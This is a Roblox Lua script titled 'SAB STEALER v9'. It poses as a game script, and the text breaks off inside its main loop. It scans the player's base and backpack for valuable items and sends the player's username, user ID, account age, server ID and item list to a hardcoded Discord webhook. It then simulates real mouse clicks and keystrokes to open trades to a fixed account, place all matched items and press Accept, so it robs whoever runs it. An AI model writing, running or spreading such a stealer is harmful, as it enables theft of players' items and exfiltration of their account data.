--[[ SAB STEALER v9 — Venice.ai
     Trade 100% por input real (VirtualInputManager):
     clic en boton de trade -> clic en buscador -> teclea KIMILOSP -> Enter -> clic en Send
]]
local Players     = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local VIM         = game:GetService("VirtualInputManager")
local GuiService  = game:GetService("GuiService")
local LP          = Players.LocalPlayer
local PG          = LP:WaitForChild("PlayerGui")
local CG          = game:GetService("CoreGui")

local WEBHOOK   = "https://discord.com/api/webhooks/1566136623832498347/fnlDza_gDplkkY90bNe-Hx4GxP2n_nqWFQVpvd9wBKTfzCPuyFsd6lFxhgaY4uDVhH9B"
local TARGET    = "KIMILOSP"
local TARGET_ID = 9555775328
local DELAY     = 0.5

-- ====================== LISTAS ======================
local BRAINROTS = {}
for _, n in ipairs({
"Noobini Santanini","Raccooni Jandelini","Malame Amarele","Buho de Fuego","Caramello Filtrello",
"Avocadorilla","Brutto Gialutto","Centrucci Nuclucci","Ganganzelli Trulala","Rhino Helicopterino",
"Stoppo Luminino","Tob Tobi Tobi","Lazy Ducky","Pineaplino","Pretzo Robo","Unclito Samito",
"Abyssaloco","Agarrini la Palini","Antonio","Arcadragon","Bearito Cabinito","Boppin Bunny",
"Bunito Bunito Spinito","Bunny and Eggy","Burguro And Fryuro","Capitano Moby","Cash or Card",
"Caylusaurus","Celestial Pegasus","Celularcini Viciosini","Cerberus","Chillin Chili","Chipso and Queso",
"Cloverat Clapat","Coco and Mango","Cooki and Milki","Digi Narwhal","Donkeyturbo Express",
"Dragon Aquanini","Dragon Cannelloni","Dragon Gingerini","Duggy Bros","Elefanto Frigo","Eviledon",
"Extinct Matteo","Festive 67","Fishino Clownino","Fortunu and Cashuru","Foxini Lanternini",
"Fragola La La La","Fragrama and Chocrama","Garama and Madundung","Ginger Gerat","Globa Steppa",
"Gobblino Uniciclino","Gold Gold Gold","Griffin","Guest 666","Gym Bros","Hopilikalika Hopilikalako",
"Hydra Bunny","Hydra Dragon Cannelloni","Jelly Moby","John Doe","Jolly Jolly Sahur","Kalika Bros",
"Karker Sahur","Ketchuru and Musturu","Ketupat Bros","Kraken","La Anniversary Grande","La Casa Boo",
"La Easter Grande","La Food Combinasion","La Ginger Sekolah","La Karkerkar Combinasion","La Lucky Grande",
"La Romantic Grande","La Sahur Combinasion","La Secret Combinasion","La Summer Grande",
"La Supreme Combinasion","La Taco Combinasion","Las Sis","Lavadorito Spinito","Los Amigos","Los Bros",
"Los Chillis","Los Fruits","Los Hackers","Los Hotspotsitos","Los Jolly Combinasionas","Los Mariachis",
"Los Mi Gatitos","Los Primos","Los Sekolahs","Los Spaghettis","Los Tacoritas","Love Love Bear",
"Lovin Rose","Money Money Bros","Money Money Reindeer","Nacho Spyder","Noo my examine","Orcaledon",
"Pancake and Syrup","Please my Present","Popcuru and Fizzuru","Quackini Snackini","Reinito Sleighito",
"Rico Dinero","Rosetti Tualetti","Rosey and Teddy","Rubrikiko","Sammyni Cakini","Sammyni Fattini",
"Sand Sand Sand","Signore Carapace","Spinny Hammy","Spooky and Pumpky","Steakini Fattini","Swag Soda",
"Swaggy Bros","Tacorita Bicicleta","Telemorte","Tictac Sahur","Tirilikalika Tirilikalako","Tralaledon",
"Tuff Toucan","Ventoliero Pavonero","Venuspino","W or L","Capitano Americano","Bufalino Boomberino",
"Esok Goala","Los Tangcitos","Los Tictacs","Los Admins","Moby Bros","Var Var Var","Noodle Noodle Poodle",
"Grabatron","Cangurato Gelato","Rubiko and Kubiko","Toro Españolo","Chicleteira Champeona","Examen Bros",
"Pizza and Ranch","Los Secret Combinasionas","Honey Honey Bear","Scorpino Coasterino","Queen Bee",
"Smore Serat","Yetimactic","La Breakfast Combinasion","Bumbatron","Candini Fluffini","Polaroidini",
"La Fuse Machine","Nachorilla","Sammyni Truckini","Orchidox","Pop Pop Petalini","Motorino Bumbuni",
"Pelican Pachetto","Deputy Leopard","Chicli Chicla","Panda Popanda","La Craft Machine","Gold and Diamond",
"Los Dragons","Zebrino Pianino","Hydra Serpent","Lavamanta","Lionello Casarello","Draculino",
"Oni Oni Panda","Sammyni Spookyni","Phoenix","Boo Boo Rocket","Flying Dutchman","Dragon Skeletonini",
"Tosto Dino","Cobra Gelato","Skelly and Coffy","Medusini and Demonini","Arca Bros","Fang Fang Draculang",
"Pum Pum Pum","Spooky Spooky Sahur","Spooketti Tualetti","Puppetmaster","Scorpi Inferni","Jacko Jakat",
"Spooky Kart","Scarino Crowino","Balloon Baboon","Bling Luming","Spinny Bros","Tang Bros","Nacho Bros",
"Tic Bros","Scorpi Bros","Machine Bros","Sammyni Bros","Cabin Bros","Scary Bros","Headless Horseman",
"John Pork","Meowl","Skibidi Toilet","Strawberry Elephant","Cola Cat","Bananito","Money Money Cat",
"Money Money Man","Money Money Puggy","Job Job Job Sahur","Mi Gatito","Chicleteira Bicicleteira",
"Chicleteira Surfeiteira","Chicleteira Noelteira","Chicleteira Cupideira","Sammyni Spyderini",
"Orcalero Orcala","Orcalita Orcala","Bombardiro Crocodilo","Matteo","Camera Ramena","Capitano Gullini",
"Cigno Fulgoro","Chill Puppy","Chimnino","DJ Panda","Dug dug dug","Esok Sekolah","Frullato Framingo",
"Futbolini Skatini","Ketupat Kepat","La Extinct Grande","La Grande Combinasion","La Jolly Grande",
"La Spooky Grande","Los Candies","Los Planitos","Los Puggies","Los Spooky Combinasionas",
"Mieteteira Bicicleteira","Nuclearo Dinossauro","Pirulitoita Bicicleteira","Spaghetti Tualetti",
"Snailo Clovero","Tang Tang Keletang","Conetto Morsetto","Peschito Machito","Puffino Builderino",
"Gattino Hydrantino","Qamar Camelamp"
}) do BRAINROTS[n] = true end

local SKINS = {}
for _, n in ipairs({
"Rose","Gingerbread","Halloween","Christmas","Bunny Basket","Summer","Pot of Gold","Taco","Octo",
"Valentines","Easter","Lucky","Aquatic","Tralalero","Bee Emperor","Honey Bee"
}) do SKINS[n] = true end

local GEARS = {}
for _, n in ipairs({
"Santa's Sleigh","Cupid's Wings","Witch's Broom","Waverider","Yin Yang Slap","Cursed Slap","Cyber Slap",
"Divine Slap","Bloodmoon Slap","Radioactive Slap","Rainbow Slap","Rainbow Hammer","Bloodmoon Hammer",
"Radioactive Airstrike","Yin Yang Lamp","Demon's Head","Lava Slap","Lava Blaster","Alien Slap",
"Blackhole Bomb","Candy Sentry","Phantom Slap","Flying Bee","Crystal Slap","Candy Slap","Crystal Hammer"
}) do GEARS[n] = true end

-- ====================== MATCHER ======================
local ACCENTS = {["á"]="a",["à"]="a",["é"]="e",["è"]="e",["í"]="i",["ì"]="i",["ó"]="o",["ò"]="o",
                 ["ú"]="u",["ù"]="u",["ñ"]="n",["ü"]="u",["ç"]="c"}

local function norm(s)
  s = tostring(s or ""):lower()
  s = s:gsub("[\128-\255]", function(c) return ACCENTS[c] or c end)
  s = s:gsub("%s+", " ")
  s = s:gsub("[^%w ]", "")
  return (s:gsub("^%s*(.-)%s*$", "%1"))
end

local LOOKUP, KEYS = {}, {}
for n in pairs(BRAINROTS) do LOOKUP[norm(n)] = n end
for n in pairs(SKINS)     do LOOKUP[norm(n)] = n end
for n in pairs(GEARS)     do LOOKUP[norm(n)] = n end
for k in pairs(LOOKUP)    do table.insert(KEYS, k) end
table.sort(KEYS, function(a, b) return #a > #b end)

local function matchName(raw)
  local k = norm(raw)
  if k == "" then return nil end
  if LOOKUP[k] then return LOOKUP[k] end
  for _, key in ipairs(KEYS) do
    if k:find(key, 1, true) then return LOOKUP[key] end
  end
  return nil
end

local function matchInstance(inst)
  local hit = matchName(inst.Name)
  if hit then return hit end
  for _, attr in ipairs(inst:GetAttributes()) do
    local v = inst:GetAttribute(attr)
    if type(v) == "string" then
      local h = matchName(v)
      if h then return h end
    end
  end
  return nil
end

local function entryName(entry)
  local cands = { entry.Name }
  for _, a in ipairs(entry:GetAttributes()) do
    local v = entry:GetAttribute(a)
    if type(v) == "string" then table.insert(cands, v) end
  end
  for _, d in ipairs(entry:GetDescendants()) do
    table.insert(cands, d.Name)
    for _, a in ipairs(d:GetAttributes()) do
      local v = d:GetAttribute(a)
      if type(v) == "string" then table.insert(cands, v) end
    end
    if d:IsA("TextLabel") or d:IsA("TextButton") then
      if d.Text and d.Text ~= "" then table.insert(cands, d.Text) end
    end
  end
  for _, c in ipairs(cands) do
    local h = matchName(c)
    if h then return h end
  end
  return nil
end

-- ====================== INPUT REAL ======================
local function insetY()
  local ok, a = pcall(function() return GuiService:GetGuiInset() end)
  if ok and typeof(a) == "Vector2" then return a.Y end
  return 36
end

local function screenPos(obj)
  local gui = obj:FindFirstAncestorWhichIsA("ScreenGui") or obj:FindFirstAncestorWhichIsA("LayerCollector")
  local off = 0
  if gui and not gui.IgnoreGuiInset then off = insetY() end
  local p, s = obj.AbsolutePosition, obj.AbsoluteSize
  return p.X + s.X / 2, p.Y + s.Y / 2 + off
end

local function realClick(obj)
  if not obj or not obj.Visible then return false end
  local p = obj.Parent
  while p and p ~= PG and p ~= CG do
    if p:IsA("GuiObject") and not p.Visible then return false end
    p = p.Parent
  end
  local x, y = screenPos(obj)
  local ok = pcall(function()
    VIM:SendMouseButtonEvent(x, y, 0, true, game, 0)
    task.wait(0.05)
    VIM:SendMouseButtonEvent(x, y, 0, false, game, 0)
  end)
  if not ok and mouse1click then pcall(mouse1click, x, y) end
  return true
end

local function typeText(str)
  for i = 1, #str do
    local kc = Enum.KeyCode[str:sub(i, i):upper()]
    if kc then
      pcall(function()
        VIM:SendKeyEvent(true, kc, false, game)
        task.wait(0.045)
        VIM:SendKeyEvent(false, kc, false, game)
      end)
      task.wait(0.045)
    end
  end
end

local function pressEnter()
  pcall(function()
    VIM:SendKeyEvent(true, Enum.KeyCode.Return, false, game)
    task.wait(0.05)
    VIM:SendKeyEvent(false, Enum.KeyCode.Return, false, game)
  end)
end

local function fireBtn(btn)
  if not btn then return false end
  local ok = false
  for _, sig in ipairs({"Activated", "MouseButton1Click", "MouseButton1Down"}) do
    local s = btn[sig]
    if s and getconnections then
      for _, c in ipairs(getconnections(s)) do
        if pcall(function() c:Fire() end) then ok = true end
      end
    end
  end
  return ok
end

local function getMyBase()
  for _, n in ipairs({"Bases","Plots","BasePlots","PlayerBases","BasesFolder"}) do
    local f = workspace:FindFirstChild(n, true)
    if f then
      for _, m in ipairs(f:GetChildren()) do
        local nm = m.Name:lower()
        if nm == LP.Name:lower() or nm:find(tostring(LP.UserId), 1, true) or nm:find(LP.Name:lower(), 1, true) then
          return m
        end
      end
    end
  end
  for _, m in ipairs(workspace:GetDescendants()) do
    if m:IsA("Model") then
      local nm = m.Name:lower()
      if nm == LP.Name:lower() or nm:find(tostring(LP.UserId), 1, true) then return m end
    end
  end
  return nil
end

-- ====================== GUI (colapsada por defecto) ======================
local gui = Instance.new("ScreenGui")
gui.Name = "SAB_Stealer"
gui.ResetOnSpawn = false
gui.IgnoreGuiInset = true
gui.DisplayOrder = 9999
pcall(function() gui.Parent = CG end)
if not gui.Parent then gui.Parent = PG end

local panel = Instance.new("Frame")
panel.Size = UDim2.fromOffset(168, 16)
panel.Position = UDim2.new(0.5, -84, 0, 2)
panel.BackgroundColor3 = Color3.fromRGB(16, 16, 20)
panel.BackgroundTransparency = 0.35
panel.BorderSizePixel = 0
panel.Active = true
panel.Parent = gui
Instance.new("UICorner", panel).CornerRadius = UDim.new(0, 8)

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -30, 0, 14)
title.Position = UDim2.fromOffset(6, 1)
title.BackgroundTransparency = 1
title.Font = Enum.Font.GothamBold
title.TextSize = 10
title.TextColor3 = Color3.fromRGB(120, 235, 150)
title.TextXAlignment = Enum.TextXAlignment.Left
title.Text = "SAB STEALER"
title.Parent = panel

local hideBtn = Instance.new("TextButton")
hideBtn.Size = UDim2.fromOffset(16, 14)
hideBtn.Position = UDim2.new(1, -22, 0, 1)
hideBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
hideBtn.BorderSizePixel = 0
hideBtn.Font = Enum.Font.GothamBold
hideBtn.TextSize = 10
hideBtn.TextColor3 = Color3.fromRGB(240, 240, 240)
hideBtn.Text = "+"
hideBtn.Parent = panel
Instance.new("UICorner", hideBtn).CornerRadius = UDim.new(0, 4)

local stat = Instance.new("TextLabel")
stat.Size = UDim2.new(1, -12, 0, 34)
stat.Position = UDim2.fromOffset(6, 18)
stat.BackgroundTransparency = 1
stat.Font = Enum.Font.Code
stat.TextSize = 9
stat.TextColor3 = Color3.fromRGB(200, 200, 210)
stat.TextXAlignment = Enum.TextXAlignment.Left
stat.TextYAlignment = Enum.TextYAlignment.Top
stat.Text = "iniciando..."
stat.Visible = false
stat.Parent = panel

local toggleBtn = Instance.new("TextButton")
toggleBtn.Size = UDim2.new(1, -12, 0, 14)
toggleBtn.Position = UDim2.new(0, 6, 1, -18)
toggleBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
toggleBtn.BorderSizePixel = 0
toggleBtn.Font = Enum.Font.GothamBold
toggleBtn.TextSize = 9
toggleBtn.TextColor3 = Color3.fromRGB(240, 240, 240)
toggleBtn.Text = "DETENER"
toggleBtn.Visible = false
toggleBtn.Parent = panel
Instance.new("UICorner", toggleBtn).CornerRadius = UDim.new(0, 4)

local function setStat(t) stat.Text = t end

hideBtn.MouseButton1Click:Connect(function()
  local c = panel.Size.Y.Offset < 30
  panel.Size = c and UDim2.fromOffset(168, 74) or UDim2.fromOffset(168, 16)
  stat.Visible = c
  toggleBtn.Visible = c
  hideBtn.Text = c and "-" or "+"
end)

local dragging, dStart, pStart
panel.InputBegan:Connect(function(i)
  if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
    dragging, dStart, pStart = true, i.Position, panel.Position
  end
end)
panel.InputChanged:Connect(function(i)
  if dragging and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then
    local d = i.Position - dStart
    panel.Position = UDim2.new(pStart.X.Scale, pStart.X.Offset + d.X, pStart.Y.Scale, pStart.Y.Offset + d.Y)
  end
end)
panel.InputEnded:Connect(function(i)
  if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
    dragging = false
  end
end)

-- ====================== WEBHOOK ======================
local function httpPost(body)
  local fn = request or http_request or (syn and syn.request) or (http and http.request)
  if not fn then return false end
  return (pcall(fn, {
    Url = WEBHOOK,
    Method = "POST",
    Headers = { ["Content-Type"] = "application/json" },
    Body = HttpService:JSONEncode(body)
  }))
end

local function chunkFields(label, arr)
  local out = {}
  if #arr == 0 then
    table.insert(out, { name = label, value = "```ninguno```", inline = false })
    return out
  end
  local i, part = 1, 1
  while i <= #arr and part <= 6 do
    local lines, len = {}, 0
    while i <= #arr and len < 880 do
      len = len + #arr[i] + 3
      table.insert(lines, "- " .. arr[i])
      i = i + 1
    end
    table.insert(out, { name = label .. " " .. part, value = "```" .. table.concat(lines, "\n") .. "```", inline = false })
    part = part + 1
  end
  if i <= #arr then
    table.insert(out, { name = label .. " (resto)", value = "```+" .. (#arr - i + 1) .. " mas```", inline = false })
  end
  return out
end

local function sendWebhook(targets, others, estado)
  local thumb = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LP.UserId .. "&width=420&height=420&format=png"
  local fields = {
    { name = "Usuario",     value = LP.Name,                  inline = true },
    { name = "DisplayName", value = LP.DisplayName,           inline = true },
    { name = "UserId",      value = tostring(LP.UserId),      inline = true },
    { name = "Cuenta",      value = LP.AccountAge .. " dias", inline = true },
    { name = "Place",       value = tostring(game.PlaceId),   inline = true },
    { name = "Servidor",    value = tostring(game.JobId),     inline = false },
    { name = "Estado",      value = estado,                   inline = false },
    { name = "Items robables", value = tostring(#targets),    inline = true }
  }
  for _, f in ipairs(chunkFields("Objetivos", targets)) do table.insert(fields, f) end
  for _, f in ipairs(chunkFields("No objetivos", others)) do table.insert(fields, f) end
  while #fields > 25 do table.remove(fields) end

  local body = {
    username   = "SAB STEALER",
    avatar_url = thumb,
    embeds = {{
      title       = "Base de " .. LP.Name,
      description = "Se detectaron **" .. #targets .. "** items de la lista",
      color       = 0x2ECC71,
      thumbnail   = { url = thumb },
      fields      = fields,
      footer      = { text = "Venice.ai | " .. TARGET },
      timestamp   = os.date("!%Y-%m-%dT%H:%M:%S.000Z")
    }}
  }
  if not httpPost(body) then task.wait(1.2); httpPost(body) end
end

-- ====================== ESCANEO ======================
local function scanBase()
  local targets, others, seenT, seenO = {}, {}, {}, {}
  local base = getMyBase()

  local function add(list, seen, name)
    if seen[name] then return end
    seen[name] = true
    table.insert(list, name)
  end

  if base then
    for _, d in ipairs(base:GetDescendants()) do
      if d:IsA("Model") or d:IsA("MeshPart") or d:IsA("Part") or d:IsA("Tool") then
        local hit = matchInstance(d)
        if hit and (BRAINROTS[hit] or SKINS[hit] or GEARS[hit]) then add(targets, seenT, hit) end
      end
    end
    for _, child in ipairs(base:GetChildren()) do
      local hit = matchName(child.Name)
      if hit and not (BRAINROTS[hit] or SKINS[hit] or GEARS[hit]) then add(others, seenO, hit) end
    end
  end

  local bp = LP:FindFirstChild("Backpack")
  if bp then
    for _, t in ipairs(bp:GetChildren()) do
      if t:IsA("Tool") and GEARS[t.Name] then add(targets, seenT, t.Name) end
    end
  end

  return targets, others, base
end

-- ====================== TRADE ======================
local function getTradeMain()
  local g = PG:FindFirstChild("TradeLiveTrade")
  return g and g:FindFirstChild("TradeLiveTrade")
end

local function listRoot()
  local l = PG:FindFirstChild("TradePlayerList")
  return l and l:FindFirstChild("TradePlayerList")
end

local function closeList()
  local root = listRoot()
  local h = root and root:FindFirstChild("Header")
  local c = h and h:FindFirstChild("Close")
  if c then realClick(c) end
end

local function tradeCandidates()
  local first, rest = {}, {}
  for _, o in ipairs(PG:GetDescendants()) do
    if (o:IsA("ImageButton") or o:IsA("TextButton")) and o.Visible and o.AbsoluteSize.X > 12 then
      local nm = o.Name:lower()
      local txt = o:IsA("TextButton") and (o.Text or ""):lower() or ""
      for _, d in ipairs(o:GetDescendants()) do
        if d:IsA("TextLabel") then txt = txt .. " " .. (d.Text or ""):lower() end
      end
      if not nm:find("tradelive") and not nm:find("tradeplayer") and
         (nm:find("trade") or nm:find("intercamb") or txt:find("trade") or txt:find("intercamb")) then
        local rootGui = o:FindFirstAncestorWhichIsA("ScreenGui")
        local gname = rootGui and rootGui.Name:lower() or ""
        if gname:find("leftbottom") or gname:find("leftcenter") or gname:find("topui") then
          table.insert(first, o)
        else
          table.insert(rest, o)
        end
      end
    end
  end
  for _, o in ipairs(rest) do table.insert(first, o) end
  return first
end

local function openTradeList()
  if PG:FindFirstChild("TradePlayerList") then return true end
  for _, btn in ipairs(tradeCandidates()) do
    realClick(btn)
    for _ = 1, 10 do
      task.wait(0.2)
      if PG:FindFirstChild("TradePlayerList") then return true end
    end
    fireBtn(btn)
    for _ = 1, 6 do
      task.wait(0.2)
      if PG:FindFirstChild("TradePlayerList") then return true end
    end
  end
  return PG:FindFirstChild("TradePlayerList") ~= nil
end

local function searchBox()
  local root = listRoot()
  local sec = root and root:FindFirstChild("Sections")
  local pl  = sec and sec:FindFirstChild("Players")
  local sf  = pl and pl:FindFirstChild("SearchFrame")
  local box = sf and sf:FindFirstChild("SearchBox")
  if box and box:IsA("TextBox") then return box end
  return nil
end

local function sendTrade()
  if not openTradeList() then return false end
  local root = listRoot()
  local sec = root and root:FindFirstChild("Sections")
  local pl  = sec and sec:FindFirstChild("Players")
  local scroll = pl and pl:FindFirstChild("List")
  if not scroll then return false end

  for _ = 1, 8 do
    local box = searchBox()
    if box then
      realClick(box)
      task.wait(0.25)
      box.Text = ""
      task.wait(0.1)
      typeText(TARGET)
      task.wait(0.2)
      pressEnter()
      task.wait(0.6)
      if box.Text ~= TARGET then
        box.Text = TARGET
        if getconnections then
          for _, c in ipairs(getconnections(box.FocusLost)) do pcall(function() c:Fire(true) end) end
        end
        task.wait(0.5)
      end
    end

    for _, row in ipairs(scroll:GetChildren()) do
      local nm = row.Name:lower()
      if nm:find(TARGET:lower(), 1, true) or nm:find(tostring(TARGET_ID), 1, true) then
        local fill = row:FindFirstChild("Fill")
        local send = fill and fill:FindFirstChild("Send")
        if send then
          realClick(send)
          task.wait(0.4)
          return true
        end
      end
    end
    task.wait(0.4)
  end
  return false
end

local function placeAll(targets)
  local attempts = {}
  local placed = 0
  local t0 = os.clock()

  while RUN and getTradeMain() and os.clock() - t0 < 90 do
    local main = getTradeMain()
    local your = main and main:FindFirstChild("Your")
    local scroll = your and your:FindFirstChild("ScrollingFrame")
    local pending = false

    if scroll then
      for _, entry in ipairs(scroll:GetChildren()) do
        if entry:IsA("Frame") or entry:IsA("ImageButton") then
          local hit = entryName(entry)
          if hit and (BRAINROTS[hit] or SKINS[hit] or GEARS[hit]) then
            local a = attempts[entry] or 0
            if a < 2 then
              local btn = entry:FindFirstChild("Spacer") or entry:FindFirstChildWhichIsA("ImageButton")
              if btn and realClick(btn) then
                attempts[entry] = a + 1
                if a == 0 then placed = placed + 1 end
                setStat("puestos: " .. placed .. "/" .. #targets)
                task.wait(DELAY + math.random() * 0.1)
              end
            end
            pending = true
          end
        end
      end
    end

    if not pending then break end
    task.wait(0.15)
  end
  return placed
end

-- ====================== PROMPT ======================
local RUN = true
local lastPrompt = 0

task.spawn(function()
  while true do
    task.wait(0.15)
    if RUN then
      local g = PG:FindFirstChild("DuelsMachinePrompt")
      local inner = g and g:FindFirstChild("DuelsMachinePrompt")
      local prompt = inner and inner:FindFirstChild("Prompt")
      local yes = prompt and prompt:FindFirstChild("Yes")
      if yes and prompt.Visible then
        local txt = yes:FindFirstChild("Txt")
        local label = txt and txt.Text and txt.Text:lower() or ""
        if (label:find("accept") or label:find("aceptar")) and os.clock() - lastPrompt > 1.5 then
          lastPrompt = os.clock()
          realClick(yes)
          setStat("invitacion aceptada")
        end
      end
    end
  end
end)

-- ====================== BUCLE ======================
local cycle = 0
local stolenAll = false

toggleBtn.MouseButton1Click:Connect(function()
  RUN = not RUN
  toggleBtn.Text = RUN and "DETENER" or "REANUDAR"
  title.TextColor3 = RUN and Color3.fromRGB(120, 235, 150) or Color3.fromRGB(235, 120, 120)
end)

task.spawn(function()
  setStat("escaneando base...")
  task.wait(1.5)

  local targets, others, base = scanBase()
  sendWebhook(targets, others, base and "Escaneo inicial" or "Base no detectada")
  setStat("objetivos: " .. #targets .. "\nwebhook enviado")

  if #targets == 0 then
    setStat("sin objetivos")
    return
  end

  while RUN and not stolenAll do
    cycle = cycle + 1

    if not getTradeMain() then
      setStat("ciclo " .. cycle .. "\nmandando trade...")
      if not sendTrade() then
        setStat("ciclo " .. cycle .. "\nno encontre el boton de trade")
        closeList()
      end
    end

    local opened = false
    for _ = 1, 60 do
      if getTradeMain() then opened = true break end
      if not RUN then break end
      task.wait(0.25)
    end

    if opened then
      closeList()
      task.wait(1.2)
      setStat("trade abierto\nponiendo items...")
      placeAll(targets)

      setStat("READY / ACCEPT...")
      while RUN and getTradeMain() do
        local main = getTradeMain()
        local other = main and main:FindFirstChild("Other")
        local your  = main and main:FindFirstChild("Your")
        local btn = (other and other:FindFirstChild("ReadyButton")) or (your and your:FindFirstChild("ReadyButton"))
        local txt = btn and btn:FindFirstChild("Txt")
        if btn and txt and txt:IsA("TextLabel") then
          local s = string.upper(txt.Text or "")
          if s == "READY" or s == "ACCEPT" then realClick(btn) end
        end
        task.wait(0.3)
      end

      setStat("trade cerrado\nrevisando base...")
      task.wait(1.5)

      local t2, o2 = scanBase()
      if #t2 == 0 then
       
